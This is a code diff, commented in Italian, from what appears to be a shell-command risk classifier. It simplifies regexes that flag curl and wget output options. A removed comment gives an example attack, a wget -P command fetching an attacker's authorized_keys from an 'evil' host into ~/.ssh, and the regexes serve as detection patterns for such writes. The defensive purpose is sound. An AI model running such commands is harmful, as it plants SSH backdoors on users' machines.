@@ -336,28 +336,14 @@
   // server). Non tentiamo di distinguere il percorso "sensibile" da quello
   // innocuo: è inaffidabile (path relativi, ~, symlink, differenze OS) e un
   // falso negativo qui = il buco di sicurezza; l'over-cautela costa solo attrito.
-  // Check curl/wget-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
+  // Check curl-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
   // significherebbe altro. In un bundle di short-flag l'unico modo di avere una
-  // `o`/`O` è che sia il flag di output (curl -o/-O, wget -o=logfile/-O): gli
-  // altri short-flag di curl/wget non contengono `o`, quindi `-[a-z]*o` non ha
-  // falsi positivi qui. `-J`/--remote-header-name senza -O è inerte, e con -O è
-  // già coperto da -O: non serve intercettare la `j` (che confliggerebbe con
-  // curl -j = --junk-session-cookies, innocuo).
-  const CURL_WGET_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
-
-  // wget con `-P`/`--directory-prefix` sceglie la CARTELLA di destinazione e il
-  // nome del file arriva dall'URL (quindi dal server): `wget -P ~/.ssh http://
-  // evil/authorized_keys` scarica contenuto interamente scelto dall'attaccante
-  // dritto in ~/.ssh/authorized_keys. È la stessa backdoor di `-O`, solo scritta
-  // scegliendo la dir invece del file → deve salire a 3. Check wget-specifico:
-  // `-P` (uppercase) è, in wget, SOLO `--directory-prefix` (nessun altro
-  // short-flag wget usa la P maiuscola), quindi anche dentro un bundle
-  // (`-rP /dir`, `-P/dir` attaccato) l'unica lettura possibile è quella. La `P`
-  // è case-SENSITIVE apposta: `-p` = `--page-requisites` (scrive nella cwd, non
-  // arbitrario) e `-np` = `--no-parent` NON devono salire. `--directory-prefix`
-  // (doppio trattino) è gestito a parte: il ramo short a trattino singolo non lo
-  // intercetta.
-  const WGET_PREFIX_RE = /(^|\s)(--directory-prefix(=|\s|$)|-[a-zA-Z]*P)/;
+  // `o`/`O` è che sia il flag di output (curl -o/-O): gli altri short-flag di
+  // curl non contengono `o`, quindi `-[a-z]*o` non ha falsi positivi qui.
+  // `-J`/--remote-header-name senza -O è inerte, e con -O è già coperto da -O:
+  // non serve intercettare la `j` (che confliggerebbe con curl -j =
+  // --junk-session-cookies, innocuo). wget non passa di qui: è 3 comunque.
+  const CURL_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
 
   // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
   // percorso arbitrario: il contenuto lo decide il server (quindi l'attaccante
